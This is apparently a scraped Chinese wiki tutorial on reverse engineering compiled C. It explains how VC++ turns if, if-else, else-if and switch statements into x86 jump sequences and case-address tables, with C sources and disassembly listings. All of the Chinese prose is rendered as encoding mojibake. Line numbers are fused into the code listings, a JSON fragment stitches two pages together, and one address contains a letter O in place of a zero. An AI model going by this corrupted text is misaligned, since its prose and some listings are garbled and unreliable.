å¦‚æœè¡¨è¾¾å¼ä¸ºå‡å€¼ï¼ˆä¸º0ï¼‰ï¼Œåˆ™è·³è¿‡ifè¯­å¥å—ï¼Œç»§ç»­è¿è¡Œç¨‹åºçš„å…¶ä»–è¯­å¥ã€‚ å¯¹åº”åˆ°ç”Ÿæˆçš„æ±‡ç¼–æŒ‡ä»¤æ˜¯ï¼š å¦‚æœè¡¨è¾¾å¼ä¸ºçœŸå€¼ï¼ˆé0ï¼‰ï¼Œåˆ™ä¸è·³è½¬ï¼Œé¡ºåºæ‰§è¡Œ å¦‚æœè¡¨è¾¾å¼ä¸ºå‡å€¼ï¼ˆä¸º0ï¼‰ï¼Œåˆ™è·³è¿‡ifè¯­å¥å— Cè¯­è¨€ä¸­ifè¯­å¥çš„è§„å®šï¼Œæ˜¯æ»¡è¶³ifåˆ¤å®šçš„è¡¨è¾¾å¼å°±æ‰§è¡Œifè¯­å¥å—ï¼›è€Œåœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼ŒjccæŒ‡ä»¤æ˜¯æ»¡è¶³æŸæ¡ä»¶åˆ™è·³è½¬ï¼Œè·³è¿‡ä¸€äº›ä»£ç å—ã€‚æ‰€ä»¥ï¼Œåœ¨è½¬æ¢æˆæ±‡ç¼–ä»£ç åï¼Œå°±æ˜¯ifè¡¨è¾¾å¼ç»“æœä¸ºå‡ï¼Œåˆ™è·³è¿‡ifè¯­å¥å—ã€‚ å› æ­¤ï¼Œifè¯­å¥è½¬æ¢åçš„æ±‡ç¼–ä»£ç æ˜¯å–æºç ä¸­ç›¸åçš„æ¡ä»¶è·³è½¬æŒ‡ä»¤ã€‚ ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œæºç æ˜¯&gt;0æˆç«‹åˆ™æ‰§è¡Œifè¯­å¥å—ã€‚æ±‡ç¼–ç”Ÿæˆçš„jccæŒ‡ä»¤æ˜¯jleæŒ‡ä»¤ï¼Œ&lt;=åˆ™è·³è¿‡ifè¯­å¥å—ã€‚ 123456789#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; if (argc &gt; 0) &#123; printf(&quot;%d &quot;, argc); &#125; return 0;&#125; x86_vcï¼ˆDebugç‰ˆï¼‰x86_vsï¼ˆDebugç‰ˆï¼‰1234567891011121314151617181920212200401010 push ebp00401011 mov ebp,esp00401013 sub esp,40h00401016 push ebx00401017 push esi00401018 push edi00401019 lea edi,[ebp-40h]0040101C mov ecx,10h00401021 mov eax,0CCCCCCCCh00401026 rep stos dword ptr [edi]00401028 cmp dword ptr [ebp+8],00040102C jle main+2Fh (0040103f) ;å¦‚æœargc&lt;=0ï¼Œåˆ™è·³è½¬åˆ°ifç»“æŸä»£ç å—&#123;0040102E mov eax,dword ptr [ebp+8]00401031 push eax00401032 push offset string &quot;%d &quot; (0042201c)00401037 call printf (00401070)0040103C add esp,8 ;ifè¯­å¥å—ä»£ç &#125;0040103F xor eax,eax ;ifç»“æŸä»£ç å—123456789101112131415161700401000 push ebp00401001 mov ebp, esp00401003 cmp dword ptr [ebp+8],000401007 jle short loc_40101A ;å¦‚æœargc&lt;=0ï¼Œåˆ™è·³è½¬åˆ°ifç»“æŸä»£ç å—&#123;00401009 mov eax,[ebp+8]0040100C push eax004010OD push offset unk_41216000401012 call sub_40106000401017 add esp,8 ;ifè¯­å¥å—ä»£ç &#125;0040101A loc_40101A: ;ifç»“æŸä»£ç å—0040101A xor eax, eax0040101C pop ebp0040101D retn ä»æ±‡ç¼–æ­£å‘è§’åº¦è§£é‡Šï¼šä¸ºä»€ä¹ˆç”Ÿæˆçš„jccæŒ‡ä»¤ä¸Cè¯­è¨€ä¸­è¡¨è¾¾å¼ç›¸åï¼Ÿç”¨ç¼–å†™æ­£å‘æ±‡ç¼–ä»£ç çš„æ€è·¯æ¥è¯´æ˜ï¼š1234567891011 cmp dword ptr [ebp+8],0 jg L1+ jmp L2L1: mov eax,[ebp+8] push eax push offset string &quot;%d &quot; call printf add esp,8L2: xor eax,eaxç”Ÿæˆçš„jccæŒ‡ä»¤ä¸æºç ä¸€æ ·è¦å¤šä¸€æ¡jmpæŒ‡ä»¤ã€‚è€Œåè¿‡æ¥ç”Ÿæˆï¼Œå°±å¯ä»¥å°‘ä¸€æ¡jmpæŒ‡ä»¤ã€‚é‚£æŠŠelseè¯­å¥å—æå‰ï¼ŒæŠŠifè¯­å¥å—æ”¾åé¢ã€‚è¿™æ ·æ±‡ç¼–è¯­è¨€å’ŒCè¯­è¨€çš„åˆ¤å®šæ¡ä»¶ä¸å°±ä¸€è‡´äº†å—ï¼Ÿåœ¨Cè¯­è¨€ä¸­ï¼Œä½è¡Œæ•°çš„ä»£ç åœ¨ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å¤„åœ¨ä½åœ°å€çš„ä½ç½®ï¼Œé«˜è¡Œæ•°çš„ä»£ç åœ¨é«˜åœ°å€ã€‚æœ‰æ—¶ä¼šé€šè¿‡æ ‡å·ç›¸å‡å¾—åˆ°ä»£ç æ®µçš„é•¿åº¦ï¼Œæ‰€ä»¥Cè¯­è¨€çš„ç¼–è¯‘å™¨ä¸èƒ½éšæ„æ”¹å˜ä»£ç è¡Œåœ¨å†…å­˜ä¸­çš„é¡ºåºã€‚ æ€»ç»“ å¦‚é‡åˆ°ä»¥ä¸‹æŒ‡ä»¤åºåˆ—ï¼Œå¯æ€€ç–‘æ˜¯ä¸€ä¸ªifè¯­å¥ç»„æˆçš„å•åˆ†æ”¯ç»“æ„ã€‚æ ¹æ®æ¯”è¾ƒä¿¡æ¯å’Œæ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼Œå°†åæ±‡ç¼–ä¸­çš„è·³è½¬æ¡ä»¶ç›¸åï¼Œå³å¯æ¢å¤åˆ†æ”¯ç»“æ„åŸå‹ã€‚ 123456789;å…ˆæ˜¯æ‰§è¡Œä¼šå½±å“æ ‡å¿—ä½çš„ç›¸å…³æŒ‡ä»¤ ;éšåè·Ÿç€å„ç§æ¡ä»¶è·³è½¬æŒ‡ä»¤ jxx xxxx &#123; ... //ifè¯­å¥å—èµ·å§‹ ... ... //è¯­å¥å—ç»“æŸéƒ¨åˆ†æ²¡æœ‰jmp &#125; ... //jxxå‘ä¸‹è·³è½¬çš„åœ°å€å°±æ˜¯ifè¯­å¥å—ç»“æŸçš„åœ°æ–¹ æ³¨æ„ï¼š åœ¨åæ±‡ç¼–ä¸­ï¼Œè¡¨è¾¾å¼çŸ­è·¯å’Œifè¯­å¥ä¸¤ç§åˆ†æ”¯ç»“æ„çš„å®ç°è¿‡ç¨‹ä¸€æ · å¾ªç¯ç»“æ„ä¸­ä¹Ÿä¼šå‡ºç°ç±»ä¼¼ä»£ç ï¼Œåˆ†ææ—¶è¦ç»“åˆä¸Šä¸‹æ–‡ ifâ€¦elseâ€¦è¯­å¥ ifâ€¦elseâ€¦è¯­å¥æ ¹æ®æ‹¬å·ä¸­è¡¨è¾¾å¼è¯­å¥çš„å€¼å†³å®šæ‰§è¡Œifè¯­å¥å—è¿˜æ˜¯elseè¯­å¥å—ï¼š å¦‚æœè¡¨è¾¾å¼ä¸ºçœŸå€¼ï¼ˆé0ï¼‰ï¼Œåˆ™æ‰§è¡Œifè¯­å¥å—ï¼Œ ä¸æ‰§è¡Œelseè¯­å¥å— å¦‚æœè¡¨è¾¾å¼ä¸ºå‡å€¼ï¼ˆä¸º0ï¼‰ï¼Œåˆ™è·³è¿‡ifè¯­å¥å—ï¼Œæ‰§è¡Œelseè¯­å¥å— æ‰€ä»¥ï¼Œifâ€¦elseâ€¦è¯­å¥ï¼Œç¨‹åºåœ¨æµç¨‹é€‰æ‹©æ—¶ï¼Œå¿…ä¼šç»è¿‡ä¸¤ä¸ªåˆ†æ”¯çš„å…¶ä¸­ä¸€ä¸ªã€‚ å¯¹åº”åˆ°ç”Ÿæˆçš„æ±‡ç¼–æŒ‡ä»¤æ˜¯ï¼š å¦‚æœè¡¨è¾¾å¼ä¸ºçœŸå€¼ï¼ˆé0ï¼‰ï¼Œåˆ™ä¸è·³è½¬ï¼Œé¡ºåºæ‰§è¡Œæ‰§è¡Œifè¯­å¥å—ï¼Œéšåæ¥jmpæŒ‡ä»¤è·³è¿‡elseè¯­å¥å— å¦‚æœè¡¨è¾¾å¼ä¸ºå‡å€¼ï¼ˆä¸º0ï¼‰ï¼ŒjccæŒ‡ä»¤åˆ™è·³è¿‡ifè¯­å¥å—ï¼Œè·³åˆ°elseè¯­å¥å—é¡ºåºæ‰§è¡Œ ä¾‹ 12345678910111213#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; if (argc == 0) &#123; printf(&quot;argc == 0&quot;); &#125; else &#123; printf(&quot;argc != 0&quot;); &#125; return 0;&#125; x86_vsï¼ˆDebugç‰ˆï¼‰123456789101112131415161718192021222300401001 mov ebp,esp00401003 cmp dword ptr [ebp+8],000401007 jnz short loc_401018 ;å¦‚æœargc!=0,åˆ™è·³è½¬åˆ°elseè¯­å¥å—ä»£ç &#123;00401009 push offset aArgc00040100E call sub_40107000401013 add esp,4 ;ifè¯­å¥å—ä»£ç &#125;00401016 jmp short loc_401025 ;è·³è½¬åˆ°if_elseç»“æŸä»£ç å—&#123;00401018 loc_401018:00401018 push offset aArgc0_00040101D call sub_40107000401022 add esp,4 ;elseè¯­å¥å—ä»£ç &#125;00401025 loc_401025: ;if_elseç»“æŸä»£ç å—00401025 xor eax, eax00401027 pop ebp00401028 retn 00401003-00401013åœ°å€çš„æ±‡ç¼–æŒ‡ä»¤ä¸å‰è¾¹è®²çš„ifè¯­å¥æŒ‡ä»¤åºåˆ—ä¸€æ ·ï¼Œä¹Ÿæ˜¯å–æºç ç›¸åçš„æ¡ä»¶è·³è½¬æŒ‡ä»¤ã€‚ 00401016å¤„çš„jmpæŒ‡ä»¤ç”¨äºè·³è¿‡elseè¯­å¥å—ã€‚00401007è·³å‘çš„æ˜¯elseè¯­å¥å—ã€‚ æ€»ç»“ jccå’Œjmpä¸¤å¤„çš„è·³è½¬ä½œä¸ºâ€œæŒ‡è·¯æ˜ç¯â€ã€‚ å½“é‡åˆ°å¦‚ä¸‹æŒ‡ä»¤åºåˆ—ï¼Œå…ˆè§‚å¯Ÿå…¶ä¸­çš„ä¸¤ä¸ªè·³è½¬æŒ‡ä»¤ï¼ˆjccå’Œjmpï¼‰ã€‚å¦‚æœjccè·³åˆ°çš„åœ°å€ELSE_BEGINå‰æœ‰JMPæŒ‡ä»¤ï¼Œåˆ™è§†ä¸ºifâ€¦elseâ€¦åŒåˆ†æ”¯ç»“æ„ã€‚å¹¶ä¸”æ ¹æ®è¿™ä¸¤ä¸ªè·³è½¬æŒ‡ä»¤å¾—åˆ°ifå’Œelseè¯­å¥å—çš„è¾¹ç•Œã€‚ ifè¯­å¥å—ï¼š jccå’Œjmpä¹‹é—´ ç”±cmp+jccè¿˜åŸå‡ºifçš„æ¯”è¾ƒä¿¡æ¯ elseè¯­å¥å—ï¼š èµ·å§‹éƒ¨åˆ† jcc-&gt;ELSE_BEGINï¼Œjccè·³å‘çš„æ˜¯elseè¯­å¥å—èµ·å§‹éƒ¨åˆ† æˆ– jmpä¹‹å ç»“å°¾éƒ¨åˆ† jmp-&gt;ELSE_ENDï¼Œjmpè·³å‘çš„åœ°å€æ˜¯elseè¯­å¥å—ç»“æŸçš„åœ°å€ã€‚ 123456789101112131415161718 ;å…ˆæ‰§è¡Œå½±å“æ ‡å¿—ä½çš„ç›¸å…³æŒ‡ä»¤ jxx ELSE_BEGIN ;è·³å‘elseè¯­å¥å—çš„èµ·å§‹åœ°å€&#123; IF_BEGIN: ...... ;ifè¯­å¥å— ...... IF_END:&#125; jmp ELSE_END ;è·³å‘elseè¯­å¥å—çš„ç»“æŸåœ°å€&#123; ELSE_BEGIN: ...... ;elseè¯­å¥å— ...... ELSE_END:&#125; ...... æ³¨æ„ï¼š è¡¨è¾¾å¼çŸ­è·¯å’Œifâ€¦elseâ€¦è¯­å¥åˆ†æ”¯ç»“æ„çš„æŒ‡ä»¤åºåˆ—ç±»ä¼¼ å¤šåˆ†æ”¯æµç¨‹ ifâ€¦else ifâ€¦éƒ¨åˆ†å’Œå‰é¢è®²çš„ifâ€¦elseâ€¦è¯­å¥ä¸€æ ·ï¼Œåªä¸è¿‡jccè·³å‘çš„åœ°å€æ˜¯ä¸‹ä¸€ä¸ªelseâ€¦ifè¯­å¥å—æˆ–elseè¯­å¥å—ã€‚ è‹¥å¤šä¸ªjccæŒ‡ä»¤è·³å‘çš„åœ°å€å‰éƒ½ä¸ºjmpæŒ‡ä»¤ï¼Œä¸”è¿™äº›jmpæŒ‡ä»¤è·³å‘çš„åœ°å€ä¸€æ ·ï¼Œåˆ™è§†ä¸ºä¸€ä¸ªå¤šåˆ†æ”¯ç»“æ„ã€‚ ä¾‹ 123456789101112131415161718#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; if (argc &gt; 0) &#123; printf(&quot;argc &gt; 0&quot;); &#125; else if (argc == 0) &#123; printf(&quot;argc == 0&quot;); &#125; else &#123; printf(&quot;argc &lt;= 0&quot;); &#125; return 0;&#125; x86_vsï¼ˆDebugç‰ˆï¼‰12345678910111213141516171819202122232425262728293031323300401000 push ebp00401001 mov ebp, esp00401003 cmp dword ptr [ebp+8],000401007 jle short loc_401018 ;å¦‚æœargc&lt;=0ï¼Œåˆ™è·³è½¬åˆ°else_ifè¯­å¥å—ä»£ç &#123;00401009 push offset aArgc00040100E call sub_40108000401013 add esp,4 ;ifè¯­å¥å—ä»£ç &#125;00401016 jmp short loc_40103A ;è·³è½¬åˆ°å¤šåˆ†æ”¯ç»“æ„çš„æœ«å°¾åœ°å€&#123;00401018 cmp dword ptr [ebp+8],00040101C jnz short loc_40102D ;å¦‚æœargc!=0ï¼Œåˆ™è·³è½¬åˆ°elseè¯­å¥å—ä»£ç 0040101E push offset aArgc0_000401023 call sub_4010800401028 add esp,4 ;else_ifè¯­å¥å—ä»£ç &#125;0040102B jmp short loc_40103A ;è·³è½¬åˆ°å¤šåˆ†æ”¯ç»“æ„çš„æœ«å°¾åœ°å€&#123; //è§‚å¯Ÿåˆ°è¿™é‡Œæ— è·³è½¬0040102D push offset aArgc0_100401032 call sub_40108000401037 add esp,4 ;elseè¯­å¥å—ä»£ç &#125;0040103A xor eax, eax ;if_else_ifç»“æŸä»£ç 0040103C pop ebp0040103D retn åˆ©ç”¨jxxå’Œjmpè¯†åˆ«å‡ºifå’Œelseâ€¦ifè¯­å¥å—çš„è¾¹ç•Œ jxxæŒ‡å‡ºäº†ä¸‹ä¸€ä¸ªelseâ€¦ifçš„èµ·å§‹ç‚¹ï¼Œæˆ–ï¼Œelseçš„èµ·å§‹ç‚¹ jmpæŒ‡å‡ºäº†æ•´ä¸ªå¤šåˆ†æ”¯ç»“æ„çš„æœ«å°¾åœ°å€ï¼Œä»¥åŠï¼Œå½“å‰ifæˆ–elseâ€¦ifè¯­å¥å—çš„æœ«å°¾ å¦‚æœæŸä¸ªè¯­å¥å—ä¸­æ²¡æœ‰åˆ¤å®šï¼Œåˆ™æ˜¯elseè¯­å¥å— è¾¹ç•Œè¯†åˆ« ç‰¹ç‚¹ æ¯”è¾ƒæ¡ä»¶ ifè¯­å¥å— jccå’Œjmpä¹‹é—´ ç”±æ¯”è¾ƒåˆ¤æ–­æŒ‡ä»¤+jccè¿˜åŸå‡ºæ¯”è¾ƒä¿¡æ¯ elseâ€¦ifè¯­å¥å— èµ·å§‹éƒ¨åˆ†ï¼šä¸Šä¸€ä¸ªè¯­å¥å—jccè·³å‘çš„åœ°å€ç»“å°¾éƒ¨åˆ†ï¼šjmpä¹‹å‰ ç”±æ¯”è¾ƒåˆ¤æ–­æŒ‡ä»¤+jccè¿˜åŸå‡ºæ¯”è¾ƒä¿¡æ¯ elseè¯­å¥å— èµ·å§‹éƒ¨åˆ†ï¼šä¸Šä¸€ä¸ªè¯­å¥å—jccè·³å‘çš„åœ°å€ç»“å°¾éƒ¨åˆ†ï¼šå¤šä¸ªjmpéƒ½è·³å‘çš„åœ°å€ è¯­å¥å—ä¸­æ— jccè·³è½¬ 12345678910111213141516171819202122232425262728293031 ;æ‰§è¡Œå½±å“æ ‡å¿—ä½çš„æŒ‡ä»¤ jxx ELSE_IF_BEGIN ;è·³å‘ä¸‹ä¸€æ¡else ifè¯­å¥å—çš„é¦–åœ°å€&#123; IF_BEGIN: ...... ;ifè¯­å¥å— ...... IF_END:&#125; jmp END ;è·³è½¬åˆ°å¤šåˆ†æ”¯ç»“æ„çš„ç»“å°¾åœ°å€&#123; ELSE_IF_BEGIN: ;else ifè¯­å¥å—çš„èµ·å§‹åœ°å€ ;æ‰§è¡Œå½±å“æ ‡å¿—ä½çš„æŒ‡ä»¤ jxx ELSE_BEGIN ;è·³è½¬åˆ°elseåˆ†æ”¯è¯­å¥å—çš„é¦–åœ°å€ ...... ;else ifè¯­å¥å— ...... ELSE_IF_END: &#125; jmp END ;è·³è½¬åˆ°å¤šåˆ†æ”¯ç»“æ„çš„ç»“å°¾åœ°å€&#123; ELSE_BEGIN: //æ— è·³è½¬ï¼Œåˆ¤å®šä¸ºelseå— ...... ;elseè¯­å¥å— ...... END: ;elseè¯­å¥å—ç»“å°¾å¤„ï¼Œä¹Ÿæ˜¯å¤šåˆ†æ”¯ç»“æ„çš„ç»“å°¾å¤„&#125; ......"},{"title":"switchè¯­å¥","path":"/wiki/C++_disassembly/switchè¯­å¥_C++_disassembly.html","content":"ä¸¥è°¨ç‚¹è®²ï¼Œä¸åŒç¼–è¯‘å™¨ç®—æ³•ä¸åŒï¼Œå¯¹äºswitchè¯­å¥ç”Ÿæˆçš„åæ±‡ç¼–ä¹Ÿä¸å°½ç›¸åŒã€‚å¹¶ä¸æ˜¯åˆ†æ”¯æ•°&gt;3å°±ç”Ÿæˆåœ°å€è¡¨ã€‚ä»¥ä¸‹ä»¥VC++ç¼–è¯‘å™¨ä¸ºä¾‹ï¼Œæ³¨æ„ä½“ä¼šç¼–è¯‘å™¨å¤„ç†çš„æ–¹å¼å³å¯ã€‚ åˆ†æ”¯æ•°â‰¤3 ç¼–å†™ä¸è¶…è¿‡3æ¡caseçš„switchç»“æ„çš„ä»£ç ï¼Œå†ç”¨ifâ€¦else ifç»“æ„å®ç°ç›¸åŒåŠŸèƒ½ï¼Œè§‚å¯Ÿå®ƒä»¬çš„åæ±‡ç¼–ã€‚ switchç»“æ„ï¼ˆVC++_x86_debugï¼‰if...else ifç»“æ„ï¼ˆVC++_x86_debugï¼‰12345678910111213141516171819202122#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;n == 1&quot;); break; case 3: printf(&quot;n == 3&quot;); break; case 100: printf(&quot;n == 100&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; ä¾æ¬¡åˆ¤æ–­ï¼Œæ˜¯å¦ç­‰äº1ï¼Œæ˜¯å¦ç­‰äº3ï¼Œæ˜¯å¦ç­‰äº100ã€‚00401047å¤„çš„jmpè·³å‘defaultï¼Œå¦‚æœæ²¡æœ‰defaultï¼Œå°±åˆ°switchè¯­å¥å—ç»“å°¾ã€‚ 123456789101112131415161718192021222324#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; int n = 1; if (n == 1) &#123; printf(&quot;n == 1&quot;); &#125; else if (n == 3) &#123; printf(&quot;n == 3&quot;); &#125; else if (n == 100) &#123; printf(&quot;n == 100&quot;); &#125; else &#123; printf(&quot;default&quot;); &#125; return 0;&#125; switchåˆ†æ”¯æ•°â‰¤3æ—¶ï¼ˆdefaultä¸ç®—æ•°ï¼‰ï¼Œé‡‡ç”¨æ¨¡æ‹Ÿifâ€¦else ifçš„æ–¹æ³•ã€‚ ç»“æ„ ifâ€¦else æ¡ä»¶è·³è½¬åç´§è·Ÿè¯­å¥å— switchè¯­å¥ æ‰€æœ‰çš„æ¡ä»¶è·³è½¬éƒ½æ”¾ç½®åœ¨ä¸€èµ·æ‰€æœ‰çš„caseè¯­å¥éƒ½æ˜¯è¿åœ¨ä¸€èµ·çš„ï¼ˆè¿™æ ·å®ç°äº†Cè¯­æ³•è¦æ±‚ï¼Œåœ¨caseè¯­å¥ä¸­æ²¡æœ‰breakè¯­å¥æ—¶ï¼Œä¼šé¡ºåºæ‰§è¡Œåç»­caseè¯­å¥å—ï¼‰ åœ¨æ•ˆç‡ä¸Šæ²¡æœ‰åŒºåˆ«ï¼Œéƒ½æ˜¯ä¸€ä¸ªä¸€ä¸ªä½œæ¯”è¾ƒï¼Œç„¶åè·³orä¸è·³ã€‚ å°ç»“ çœ‹æ¯ä¸ªæ¡ä»¶è·³è½¬æŒ‡ä»¤åæ˜¯å¦è·Ÿæœ‰è¯­å¥å—ï¼Œå¦‚æœæ²¡æœ‰ï¼Œè¯†åˆ«ä¸ºswitchåˆ†æ”¯ç»“æ„ã€‚ caseè¯­å¥å— caseçš„åˆ¤å®šå€¼ï¼Œæ ¹æ®æ¯”è¾ƒä¿¡æ¯å’ŒjccæŒ‡ä»¤ç¡®å®šã€‚ èµ·å§‹åœ°å€ï¼šæ ¹æ®jccæŒ‡ä»¤è·³åˆ°çš„åœ°å€æ¥ç¡®å®šã€‚ ç»“æŸåœ°å€ å¦‚æœæœ‰breakï¼Œä¼šå‡ºç°jmpæŒ‡ä»¤ç»“å°¾ å¦‚æœæ²¡æœ‰breakï¼Œç”¨ä¸‹ä¸€ä¸ªcaseèµ·å§‹åœ°å€æ¥ç¡®å®šã€‚ 1234567891011121314151617 mov reg,mem ;å–å‡ºswitchä¸­è€ƒå¯Ÿçš„å˜é‡ ;å½±å“æ ‡å¿—ä½çš„æŒ‡ä»¤ jxx xxxx ;è·³è½¬è‡³å¯¹åº”caseè¯­å¥å—çš„é¦–åœ°å€å¤„ ;å½±å“æ ‡å¿—ä½çš„æŒ‡ä»¤ jxx xxxx ;å½±å“æ ‡å¿—ä½çš„æŒ‡ä»¤ jxx xxxx jmp END ;è·³è½¬åˆ°switchçš„ç»“å°¾åœ°å€å¤„ ... ; caseè¯­å¥å—çš„é¦–åœ°å€ jmp END ; caseè¯­å¥å—ç»“æŸï¼Œæœ‰breakåˆ™äº§ç”Ÿè¿™ä¸ªjmp ... ; caseè¯­å¥å—çš„é¦–åœ°å€ jmp END ; caseè¯­å¥å—çš„ç»“æŸï¼Œæœ‰breakåˆ™äº§ç”Ÿè¿™ä¸ªjmp ...... ; caseè¯­å¥å—çš„é¦–åœ°å€ jmp END ; caseè¯­å¥å—ç»“æŸï¼Œæœ‰breakåˆ™äº§ç”Ÿè¿™ä¸ªjmpEND: ... ; switchç»“å°¾ åœ°å€è¡¨ï¼ˆå¤§è¡¨ï¼‰ å½“åˆ†æ”¯æ•°&gt;3ï¼Œä¸”caseçš„åˆ¤å®šå€¼å­˜åœ¨æ˜æ˜¾çº¿æ€§å…³ç³»ç»„åˆæ—¶ï¼Œç¼–è¯‘å™¨ä¼šä¸ºcaseè¯­å¥åˆ¶ä½œä¸€ä»½caseåœ°å€æ•°ç»„ï¼ˆæˆ–ç§°ä¸ºcaseåœ°å€è¡¨ï¼Œæµ·å“¥è¯¾ä¸­ç§°ä¸ºå¤§è¡¨ï¼‰ï¼Œè¿™ä¸ªæ•°ç»„ä¿å­˜äº†æ¯ä¸ªcaseè¯­å¥å—çš„é¦–åœ°å€ã€‚ ä¸‹é¢é€šè¿‡å‡ ä¸ªä¾‹å­ï¼Œé€æ¸åŠ æ·±å¯¹å¤§è¡¨çš„ç†è§£ ä¾‹å­ ç›®çš„ case1-4 æœ€åŸºæœ¬çš„ä¾‹å­ case101-104 ä½“ä¼šåªè¦caseåˆ¤å®šå€¼å­˜åœ¨æ˜æ˜¾çº¿æ€§å…³ç³»ç»„åˆï¼Œå°±ä¼šä½¿ç”¨å¤§è¡¨ æ‰“ä¹±é¡ºåºçš„case1-4 è§‚å¯Ÿcaseè¯­å¥çš„é¡ºåºæ˜¯å¦å½±å“å¤§è¡¨çš„ç”Ÿæˆ ä¸­é—´ç©ºç¼ºå‡ é¡¹ 1. caseåœ°å€è¡¨ç©ºç¼ºä½ç½®å¦‚ä½•å¤„ç†2. ä½•æ—¶ç”Ÿæˆå°è¡¨ case1-4 1234567891011121314151617181920212223242526#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int n = 1; switch (n) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break; case 4: printf(&quot;case 4&quot;); break; default: printf(&quot;default&quot;); break; &#125; return 0;&#125; åœ°å€è¡¨ ç¼–è¯‘å™¨åˆ¶ä½œäº†ä¸€ä»½caseåœ°å€æ•°ç»„ï¼ˆæˆ–ç§°ä¸ºcaseåœ°å€è¡¨ï¼Œæµ·å“¥è¯¾ä¸­ç§°ä¸ºå¤§è¡¨ï¼‰ï¼Œ4å­—èŠ‚ä¸º1ä¸ªå…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯caseè¯­å¥å—çš„èµ·å§‹åœ°å€ã€‚ è¯¥ä¾‹å­ä¸­ï¼Œ4010AAhä¸ºè¿™å¼ è¡¨çš„èµ·å§‹åœ°å€ï¼Œåé¢ä¼šç”¨æ¯”ä¾‹å› å­å¯»å€[edx*4+4010AAh]æ¥æŸ¥è¡¨ï¼ˆè¿™é‡Œå°†æŸ¥è¯¢å¾—åˆ°æ•°ç»„æŸä¸ªå…ƒç´ çš„è¿‡ç¨‹ç§°ä¸ºæŸ¥è¡¨ï¼‰ã€‚ ç›¸å¯¹å…³ç³» æ¯”ä¾‹å› å­å¯»å€ åœ°å€è¡¨çš„å†…å­˜åœ°å€ é¡¹æ•° åœ°å€è¡¨ä¸­çš„å€¼ å«ä¹‰ $==&gt; $+4*0 004010AA ç¬¬0é¡¹ 0040104E case1è¯­å¥å—çš„èµ·å§‹åœ°å€ $+4 $+4*1 004010AE ç¬¬1é¡¹ 0040105D case2è¯­å¥å—çš„èµ·å§‹åœ°å€ $+8 $+4*2 004010B2 ç¬¬2é¡¹ 0040106C case3è¯­å¥å—çš„èµ·å§‹åœ°å€ $+C $+4*3 004010B6 ç¬¬3é¡¹ 0040107B case4è¯­å¥å—çš„èµ·å§‹åœ°å€ æµç¨‹è¯¦ç»†åˆ†æ å¯¹å¾…è€ƒå¯Ÿçš„å˜é‡nä½œå¤„ç†ï¼Œä½¿å…¶å¯ä½œä¸ºæ•°ç»„ä¸‹æ ‡è¿›è¡Œå¯»å€ 123450040102F mov eax,dword ptr [ebp-4]00401032 mov dword ptr [ebp-8],eax00401035 mov ecx,dword ptr [ebp-8]00401038 sub ecx,1 //å¯¹é½äºæ•°ç»„ä¸‹æ ‡ 004010AAè¿™ä¸ªåœ°å€æ˜¯éœ€è¦çš„ï¼ŒæŒ‡å‡ºåœ°å€è¡¨èµ·å§‹åœ°å€ï¼Œè¿™ä¸ªèµ·å§‹åœ°å€åŒæ—¶ä¹Ÿæ˜¯ç¬¬ä¸€é¡¹å…ƒç´ çš„åœ°å€ã€‚è€Œcaseæœ€å°å€¼ä¸ä¸€å®šåˆšå¥½æ˜¯0ï¼Œåœ¨è¿™é‡Œä¾‹å­ä¸­æ˜¯ä»1å¼€å§‹ï¼Œé‚£ä¹ˆå°±è¦å‡å»1ï¼Œä¸ºçš„æ˜¯ä»æ•°ç»„ä¸‹æ ‡0å¼€å§‹ã€‚ å®é™…ä¸Šï¼Œsubå‡å»çš„å€¼æ˜¯caseçš„æœ€å°å€¼ï¼Œè¿™æ ·å°±èƒ½å‡åˆ°0ï¼ˆä¾‹ï¼šåé¢çš„case101-104ï¼‰ã€‚ ç‰¹æ®Šæƒ…å†µï¼šcaseæœ€å°å€¼ä¸º0ï¼Œå°±æ²¡æœ‰è°ƒæ•´è¿™ä¸€æ­¥äº†ã€‚ å¾…è€ƒå¯Ÿçš„å˜é‡næ˜¯å¦å¤„äºcaseèŒƒå›´é‡Œ -1å¯¹é½åï¼Œcaseçš„æœ€å¤§å€¼æ˜¯3ï¼ˆ4-1=3ï¼‰ï¼Œæœ€å°å€¼æ˜¯0ï¼ŒèŒƒå›´æ˜¯[0,3]ã€‚ç„¶ååˆ¤æ–­næ˜¯å¦&gt;3ï¼Œå¦‚æœ&gt;3ï¼Œé‚£ä¸åœ¨caseèŒƒå›´å†…ï¼Œç›´æ¥è·³åˆ°default/switchè¯­å¥å—ç»“å°¾ã€‚ 120040103E cmp dword ptr [ebp-8],300401042 ja $L541+0Fh (0040108a) //è·³åˆ°defaulté¦–åœ°å€ é‚£å¦‚æœ&lt;caseçš„æœ€å°å€¼0å‘¢ï¼Ÿè¿™é‡Œå¾ˆå¦™ï¼Œå› ä¸ºç”¨çš„æ˜¯jaæ— ç¬¦å·æ¯”è¾ƒæŒ‡ä»¤ï¼Œå½“næ˜¯ä¸€ä¸ªè´Ÿæ•°æ—¶ï¼Œè´Ÿæ•°çš„è¡¥ç ï¼Œå½“æˆæ— ç¬¦å·æ•°è§£é‡Šä¹Ÿä¼š&gt;3ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡Œçš„jaå°±èƒ½å®Œæˆå˜é‡nå’ŒcaseèŒƒå›´ä¸¤ç«¯å¯¹æ¯”çš„ä»»åŠ¡ï¼š å½“n&lt;0ï¼ˆcaseæœ€å°å€¼ï¼‰ï¼Œjaæ¯”è¾ƒï¼Œä¼šå¤§äº3 å½“n&gt;3ï¼ˆcaseæœ€å¤§å€¼ï¼‰ï¼Œjaæ¯”è¾ƒï¼Œä¼šå¤§äº3 